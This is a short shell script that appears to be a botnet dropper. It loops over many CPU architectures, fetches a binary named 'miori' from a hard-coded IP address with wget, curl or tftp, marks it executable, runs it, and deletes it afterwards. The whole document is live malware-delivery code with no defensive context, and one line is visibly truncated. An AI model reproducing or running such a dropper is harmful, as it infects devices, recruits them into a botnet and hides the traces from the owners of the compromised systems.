binarys="mips mpsl x86 arm7 arm sh4 arm6 arm5 ppc arc spc i5 i6 m68k"
server_ip="31.7.58.162"
binname="miori"

for arch in $binarys
do
rm -rf $binname.$arch
wget http://$server_ip/$binname.$arch || curl -O http://$server_ip/$binname.$arch || tftp $server_ip -c get $binname.$a>chmod 777 $binname.$arch
./$binname.$arch $1.$arch
rm -rf $binname.$arch
done
